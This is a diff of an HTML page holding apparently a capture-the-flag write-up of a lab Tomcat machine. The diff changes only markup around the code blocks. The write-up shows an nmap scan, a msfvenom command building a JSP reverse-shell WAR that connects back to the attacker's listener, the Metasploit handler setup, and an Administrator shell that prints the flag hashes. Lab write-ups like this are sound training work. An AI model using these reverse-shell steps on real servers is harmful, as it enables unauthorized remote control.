@@ -113,16 +113,16 @@ fact it is a really easy one.</p>
 <h1>Network discovery</h1>
 <p>As usual, we start with a simple network scan using nmap in order to scan the
 open TCP ports: Only the port 8080 is open with an HTTP service.</p>
-<div class="highlight"><pre><span></span>root@kalili:~# nmap -p- 10.10.10.95 -sSV
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-03 17:38 CET
-Nmap scan report for 10.10.10.95
-Host is up (0.019s latency).
-Not shown: 65534 filtered ports
-PORT     STATE SERVICE VERSION
-8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds
+<div class="highlight"><pre><span class="code-line"><span></span>root@kalili:~# nmap -p- 10.10.10.95 -sSV</span>
+<span class="code-line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-03 17:38 CET</span>
+<span class="code-line">Nmap scan report for 10.10.10.95</span>
+<span class="code-line">Host is up (0.019s latency).</span>
+<span class="code-line">Not shown: 65534 filtered ports</span>
+<span class="code-line">PORT     STATE SERVICE VERSION</span>
+<span class="code-line">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds</span>
 </pre></div>
 
 
@@ -130,89 +130,89 @@ Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds
 <p><img alt="Tomcat application manager" src="/media/2019.09/jerry_2.png"></p>
 <h1>Exploiting the administration interface</h1>
 <p>We generate a Java reverse shell payload using <code>msfvenom</code>:</p>
-<div class="highlight"><pre><span></span>root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war &gt; reverse2.war
+<div class="highlight"><pre><span class="code-line"><span></span>root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war &gt; reverse2.war</span>
 </pre></div>
 
 
 <p>We start the handler using <code>metasploit</code>:</p>
-<div class="highlight"><pre><span></span>msf exploit(multi/handler) &gt; use exploit/multi/handler 
-msf exploit(multi/handler) &gt; show options
-
-Module options (exploit/multi/handler):
-
-  Name  Current Setting  Required  Description
-  ----  ---------------  --------  -----------
-
-
-Payload options (java/jsp_shell_reverse_tcp):
-
-  Name   Current Setting  Required  Description
-  ----   ---------------  --------  -----------
-  LHOST  10.10.15.14      yes       The listen address (an interface may be specified)
-  LPORT  4444             yes       The listen port
-  SHELL                   no        The system shell to use.
-
-
-Exploit target:
-
-  Id  Name
-  --  ----
-  0   Wildcard Target
+<div class="highlight"><pre><span class="code-line"><span></span>msf exploit(multi/handler) &gt; use exploit/multi/handler </span>
+<span class="code-line">msf exploit(multi/handler) &gt; show options</span>
+<span class="code-line"></span>
+<span class="code-line">Module options (exploit/multi/handler):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name  Current Setting  Required  Description</span>
+<span class="code-line">  ----  ---------------  --------  -----------</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Payload options (java/jsp_shell_reverse_tcp):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name   Current Setting  Required  Description</span>
+<span class="code-line">  ----   ---------------  --------  -----------</span>
+<span class="code-line">  LHOST  10.10.15.14      yes       The listen address (an interface may be specified)</span>
+<span class="code-line">  LPORT  4444             yes       The listen port</span>
+<span class="code-line">  SHELL                   no        The system shell to use.</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Exploit target:</span>
+<span class="code-line"></span>
+<span class="code-line">  Id  Name</span>
+<span class="code-line">  --  ----</span>
+<span class="code-line">  0   Wildcard Target</span>
 </pre></div>
 
 
 <p>When running the War payload we got a shell as Administrator and we can start
 listing the directories looking for the flags:</p>
-<div class="highlight"><pre><span></span>C:\apache-tomcat-7.0.88&gt;dir c:\Users
-dir c:\Users
-Volume in drive C has no label.
-Volume Serial Number is FC2B-E489
-
-Directory of c:\Users
-
-06/18/2018  10:31 PM    &lt;DIR&gt;          .
-06/18/2018  10:31 PM    &lt;DIR&gt;          ..
-06/18/2018  10:31 PM    &lt;DIR&gt;          Administrator
-08/22/2013  05:39 PM    &lt;DIR&gt;          Public
-              0 File(s)              0 bytes
-              4 Dir(s)  27,600,285,696 bytes free
-
-C:\apache-tomcat-7.0.88&gt;dir c:\Users\Administrator\Desktop\
-dir c:\Users\Administrator\Desktop\
-Volume in drive C has no label.
-Volume Serial Number is FC2B-E489
-
-Directory of c:\Users\Administrator\Desktop
-
-06/19/2018  06:09 AM    &lt;DIR&gt;          .
-06/19/2018  06:09 AM    &lt;DIR&gt;          ..
-06/19/2018  06:09 AM    &lt;DIR&gt;          flags
-              0 File(s)              0 bytes
-              3 Dir(s)  27,600,269,312 bytes free
-
-C:\apache-tomcat-7.0.88&gt;dir c:\Users\Administrator\Desktop\flags
-dir c:\Users\Administrator\Desktop\flags
-Volume in drive C has no label.
-Volume Serial Number is FC2B-E489
+<div class="highlight"><pre><span class="code-line"><span></span>C:\apache-tomcat-7.0.88&gt;dir c:\Users</span>
+<span class="code-line">dir c:\Users</span>
+<span class="code-line">Volume in drive C has no label.</span>
+<span class="code-line">Volume Serial Number is FC2B-E489</span>
+<span class="code-line"></span>
+<span class="code-line">Directory of c:\Users</span>
+<span class="code-line"></span>
+<span class="code-line">06/18/2018  10:31 PM    &lt;DIR&gt;          .</span>
+<span class="code-line">06/18/2018  10:31 PM    &lt;DIR&gt;          ..</span>
+<span class="code-line">06/18/2018  10:31 PM    &lt;DIR&gt;          Administrator</span>
+<span class="code-line">08/22/2013  05:39 PM    &lt;DIR&gt;          Public</span>
+<span class="code-line">              0 File(s)              0 bytes</span>
+<span class="code-line">              4 Dir(s)  27,600,285,696 bytes free</span>
+<span class="code-line"></span>
+<span class="code-line">C:\apache-tomcat-7.0.88&gt;dir c:\Users\Administrator\Desktop\</span>
+<span class="code-line">dir c:\Users\Administrator\Desktop\</span>
+<span class="code-line">Volume in drive C has no label.</span>
+<span class="code-line">Volume Serial Number is FC2B-E489</span>
+<span class="code-line"></span>
+<span class="code-line">Directory of c:\Users\Administrator\Desktop</span>
+<span class="code-line"></span>
+<span class="code-line">06/19/2018  06:09 AM    &lt;DIR&gt;          .</span>
+<span class="code-line">06/19/2018  06:09 AM    &lt;DIR&gt;          ..</span>
+<span class="code-line">06/19/2018  06:09 AM    &lt;DIR&gt;          flags</span>
+<span class="code-line">              0 File(s)              0 bytes</span>
+<span class="code-line">              3 Dir(s)  27,600,269,312 bytes free</span>
+<span class="code-line"></span>
+<span class="code-line">C:\apache-tomcat-7.0.88&gt;dir c:\Users\Administrator\Desktop\flags</span>
+<span class="code-line">dir c:\Users\Administrator\Desktop\flags</span>
+<span class="code-line">Volume in drive C has no label.</span>
+<span class="code-line">Volume Serial Number is FC2B-E489</span>
 </pre></div>
 
 
 <p>As we already are administrator we can read the flag for the two level:</p>
-<div class="highlight"><pre><span></span>Directory of c:\Users\Administrator\Desktop\flags
-
-06/19/2018  06:09 AM    &lt;DIR&gt;          .
-06/19/2018  06:09 AM    &lt;DIR&gt;          ..
-06/19/2018  06:11 AM                88 2 for the price of 1.txt
-              1 File(s)             88 bytes
-              2 Dir(s)  27,600,269,312 bytes free
-
-C:\apache-tomcat-7.0.88&gt;type c:\Users\Administrator\Desktop\flags\2*
-type c:\Users\Administrator\Desktop\flags\2*
-user.txt
-7004dbcef0f854e0fb401875f26ebd00
-
-root.txt
-04a8b36e1545a455393d067e772fe90e
+<div class="highlight"><pre><span class="code-line"><span></span>Directory of c:\Users\Administrator\Desktop\flags</span>
+<span class="code-line"></span>
+<span class="code-line">06/19/2018  06:09 AM    &lt;DIR&gt;          .</span>
+<span class="code-line">06/19/2018  06:09 AM    &lt;DIR&gt;          ..</span>
+<span class="code-line">06/19/2018  06:11 AM                88 2 for the price of 1.txt</span>
+<span class="code-line">              1 File(s)             88 bytes</span>
+<span class="code-line">              2 Dir(s)  27,600,269,312 bytes free</span>
+<span class="code-line"></span>
+<span class="code-line">C:\apache-tomcat-7.0.88&gt;type c:\Users\Administrator\Desktop\flags\2*</span>
+<span class="code-line">type c:\Users\Administrator\Desktop\flags\2*</span>
+<span class="code-line">user.txt</span>
+<span class="code-line">7004dbcef0f854e0fb401875f26ebd00</span>
+<span class="code-line"></span>
+<span class="code-line">root.txt</span>
+<span class="code-line">04a8b36e1545a455393d067e772fe90e</span>
 </pre></div>
     </div>
 
